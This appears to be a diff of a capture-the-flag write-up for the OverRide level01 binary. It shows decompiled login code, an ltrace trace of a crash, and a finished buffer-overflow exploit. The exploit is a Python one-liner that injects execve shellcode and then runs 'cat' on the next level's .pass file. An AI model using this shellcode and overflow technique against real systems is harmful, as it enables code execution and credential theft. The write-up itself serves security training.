@@ -62,14 +62,14 @@ int32_t main(int32_t argc, char** argv, char** envp)
 080484ed      edi_1 = edi_1 + 4
 080484fe  puts(0x80486b8)  {"********* ADMIN LOGIN PROMPT ***…"}
 0804850b  printf(0x80486df)  {"Enter Username: "}
-08048528  fgets(0x804a040, 0x100, *stdin)
+08048528  fgets(0x804a040, 256, *stdin)
 08048536  int32_t eax_2
 08048536  if (verify_user_name() != 0)
 08048544      puts(0x80486f0)  {"nope, incorrect username...\n"}
 08048549      eax_2 = 1
 08048557  else
 08048557      puts(0x804870d)  {"Enter Password: "}
-08048574      fgets(&envp, 0x64, *stdin)
+08048574      fgets(&envp, 100, *stdin)
 08048580      int32_t eax_4 = verify_user_pass(&envp)
 08048589      if (eax_4 == 0 || (eax_4 != 0 && eax_4 != 0))
 0804859e          puts(0x804871e)  {"nope, incorrect password...\n"}
@@ -91,3 +91,40 @@ https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
 offset 80
 
+
+----------
+```
+level01@OverRide:~$ ltrace -C ./level01 
+__libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)            = 39
+printf("Enter Username: ")                             = 16
+fgets(Enter Username: dat_wil
+"dat_wil\n", 256, 0xf7fcfac0)                    = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)                       = 24
+puts("Enter Password: "Enter Password: 
+)                               = 17
+fgets(BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 100, 0xf7fcfac0) = 0xffffd6dc
+puts("nope, incorrect password...\n"nope, incorrect password...
+
+)                  = 29
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+0xffffd6dc is the address where password is stored
+eip will be at the next instruction and we can overwite it.
+
+\
+http://shell-storm.org/shellcode/files/shellcode-827.php
+
+```
+(python -c  '''
+user = "dat_wil"
+shell= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+bomb = user + shell + "B" * (256 - len(user + shell) + 80)
+print bomb
+'''; whoami && cat /home/users/level02/.pass) | ./level01
+```
